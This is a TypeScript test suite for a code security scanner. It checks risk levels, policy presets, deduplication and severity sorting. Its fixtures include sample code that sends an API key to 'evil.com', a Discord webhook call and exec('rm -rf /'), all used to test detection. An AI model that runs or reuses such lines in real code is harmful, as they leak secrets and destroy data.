import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { ScanOrchestrator } from '../core/scanner.js';
import { defaultPolicy, mergePolicy, policyFromPreset } from '../core/scan-policy.js';
import type { FileInfo } from '../scanner/file-walker.js';

function makeFile(relativePath: string, content: string): FileInfo {
  const ext = '.' + relativePath.split('.').pop()!;
  return {
    path: `/scan-root/${relativePath}`,
    relativePath,
    content,
    extension: ext,
  };
}

describe('ScanOrchestrator', () => {
  describe('basic operation', () => {
    it('should return clean result for clean files', async () => {
      const orchestrator = new ScanOrchestrator();
      const files = [makeFile('clean.ts', 'export const x = 1;')];
      const result = await orchestrator.run('/scan-root', files);

      assert.equal(result.risk_level, 'low');
      assert.equal(result.findings.length, 0);
      assert.equal(result.risk_tags.length, 0);
      assert.equal(result.evidence.length, 0);
      assert.ok(result.summary.includes('No security issues'));
    });

    it('should detect threats across analyzers', async () => {
      const orchestrator = new ScanOrchestrator();
      const code = `
const secret = process.env.API_KEY;
exec("ls -la");
fetch("https://evil.com", { body: secret });
`;
      const files = [makeFile('evil.ts', code)];
      const result = await orchestrator.run('/scan-root', files);

      assert.ok(result.findings.length > 0);
      assert.ok(result.risk_level === 'high' || result.risk_level === 'critical');
      // Should have findings from both static and behavioral
      const analyzers = new Set(result.findings.map((f) => f.analyzer));
      assert.ok(analyzers.has('static'), 'Should have static findings');
      assert.ok(analyzers.has('behavioral'), 'Should have behavioral findings');
    });

    it('should include metadata with analyzers used', async () => {
      const orchestrator = new ScanOrchestrator();
      const files = [makeFile('test.ts', 'exec("ls");')];
      const result = await orchestrator.run('/scan-root', files);

      assert.ok(result.metadata.analyzers_used.includes('static'));
      assert.ok(result.metadata.files_scanned === 1);
      assert.ok(result.metadata.scan_duration_ms >= 0);
      assert.ok(result.metadata.scan_time);
    });
  });

  describe('backward compatibility', () => {
    it('should produce legacy risk_tags and evidence', async () => {
      const orchestrator = new ScanOrchestrator();
      const files = [makeFile('evil.ts', 'exec("rm -rf /");')];
      const result = await orchestrator.run('/scan-root', files);

      // Legacy fields should be populated
      assert.ok(result.risk_tags.length > 0);
      assert.ok(result.evidence.length > 0);
      assert.ok(result.evidence[0].tag);
      assert.ok(result.evidence[0].file);
      assert.ok(typeof result.evidence[0].line === 'number');
    });

    it('should produce both findings and evidence for same detections', async () => {
      const orchestrator = new ScanOrchestrator();
      const files = [makeFile('evil.ts', 'require("child_process");')];
      const result = await orchestrator.run('/scan-root', files);

      // findings and evidence should be consistent
      const staticFindings = result.findings.filter((f) => f.analyzer === 'static');
      // At minimum, evidence should contain entries from static findings
      assert.ok(staticFindings.length > 0);
      assert.ok(result.evidence.length > 0);
    });
  });

  describe('policy control', () => {
    it('should respect min_severity filtering', async () => {
      // SUSPICIOUS_IP is medium severity
      const policy = mergePolicy(defaultPolicy(), { min_severity: 'high' });
      const orchestrator = new ScanOrchestrator({ policy });
      const files = [makeFile('test.ts', 'const ip = "8.8.8.8";')];
      const result = await orchestrator.run('/scan-root', files);

      // Medium-severity findings should be filtered out
      assert.ok(!result.findings.some((f) => f.severity === 'medium'));
      assert.ok(!result.findings.some((f) => f.severity === 'low'));
    });

    it('should use permissive preset (static only)', async () => {
      const policy = policyFromPreset('permissive');
      const orchestrator = new ScanOrchestrator({ policy });
      const code = `
const secret = process.env.API_KEY;
fetch("https://evil.com", { body: secret });
`;
      const files = [makeFile('test.ts', code)];
      const result = await orchestrator.run('/scan-root', files);

      // Only static analyzer should run (behavioral disabled)
      const analyzers = new Set(result.findings.map((f) => f.analyzer));
      if (analyzers.size > 0) {
        assert.ok(!analyzers.has('behavioral'), 'Behavioral should be disabled in permissive');
      }
    });

    it('should disable behavioral when policy says so', async () => {
      const policy = mergePolicy(defaultPolicy(), {
        analyzers: { static: true, behavioral: false, llm: false },
      });
      const orchestrator = new ScanOrchestrator({ policy });
      const files = [makeFile('test.ts', 'exec("ls");')];
      const result = await orchestrator.run('/scan-root', files);

      assert.ok(!result.metadata.analyzers_used.includes('behavioral'));
    });
  });

  describe('deduplication', () => {
    it('should deduplicate overlapping findings from different analyzers', async () => {
      const orchestrator = new ScanOrchestrator();
      // This code will trigger both static SHELL_EXEC and behavioral findings
      const files = [makeFile('test.ts', 'exec("ls -la");')];
      const result = await orchestrator.run('/scan-root', files);

      // Check there are no exact duplicates (same rule+file+line)
      const seen = new Set<string>();
      for (const f of result.findings) {
        const key = `${f.rule_id}:${f.location.file}:${f.location.line}`;
        assert.ok(!seen.has(key), `Duplicate finding: ${key}`);
        seen.add(key);
      }
    });
  });

  describe('sorting', () => {
    it('should sort findings with critical first', async () => {
      const orchestrator = new ScanOrchestrator();
      const code = `
process.env.SECRET;
exec("ls");
fetch("https://discord.com/api/webhooks/123");
`;
      const files = [makeFile('test.ts', code)];
      const result = await orchestrator.run('/scan-root', files);

      if (result.findings.length > 1) {
        // Verify descending severity order
        for (let i = 1; i < result.findings.length; i++) {
          const prevWeight = severityWeight(result.findings[i - 1].severity);
          const currWeight = severityWeight(result.findings[i].severity);
          assert.ok(prevWeight >= currWeight,
            `Finding ${i} should not have higher severity than finding ${i - 1}`);
        }
      }
    });
  });
});

function severityWeight(s: string): number {
  const w: Record<string, number> = { info: 0, low: 1, medium: 2, high: 3, critical: 4 };
  return w[s] ?? 0;
}
